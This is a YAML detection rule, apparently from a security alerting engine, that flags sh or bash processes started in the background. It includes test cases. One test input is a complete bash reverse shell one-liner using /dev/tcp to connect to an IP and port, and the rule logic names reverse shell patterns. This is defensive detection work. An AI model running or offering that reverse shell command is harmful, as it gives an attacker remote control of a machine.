name: rta_background_shell
mode: alert
overlap_allowed_with: [rta_mkfifo_reverse_shell_chain]
eval: |
  (
    (e.process_name == "sh" || e.process_name == "bash") &&
    re_match(e.process_args, "(^|[^&])&([^&]|$)") &&
    !re_match(e.process_args, "/dev/(tcp|udp)/")
  )
tests:
  - cleartext: "sh in background"
    process_name: sh
    process_args: "/bin/sh &"
    should_match: true
  - cleartext: "bash in background"
    process_name: bash
    process_args: "bash -c 'echo test &'"
    should_match: true
  - cleartext: "bash /dev/tcp with & (covered by dev_tcp rule)"
    process_name: bash
    process_args: "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
    should_match: false
  - cleartext: "nohup in background (benign)"
    process_name: nohup
    process_args: "nohup long_running_task &"
    should_match: false
